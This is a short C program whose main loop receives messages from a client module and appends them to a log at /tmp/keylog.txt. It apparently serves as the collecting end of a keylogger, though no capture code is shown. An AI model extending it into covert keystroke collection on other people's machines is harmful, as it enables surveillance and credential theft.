#include <stdio.h>
#include <signal.h>
#include <stdbool.h>
#include "client_comm.h"
#include "logger.h"

static volatile bool running = true;

void handle_sigint(int sig) {
    (void)sig;
    running = false;
    printf("\nExiting program...\n");
}

int main(void) {
    char buf[1024];

    signal(SIGINT, handle_sigint);

    if (client_comm_init() < 0) return 1;
    if (logger_open("/tmp/keylog.txt") < 0) return 1;

    while (running) {
        int len = client_comm_recv(buf, sizeof(buf) - 1);
        if (len > 0) {
            buf[len] = '\0';  // Ensure null termination
            logger_write(buf);
            fflush(stdout);  // Flush stdout to see output immediately
        }
    }

    logger_close();
    client_comm_cleanup();
    return 0;
}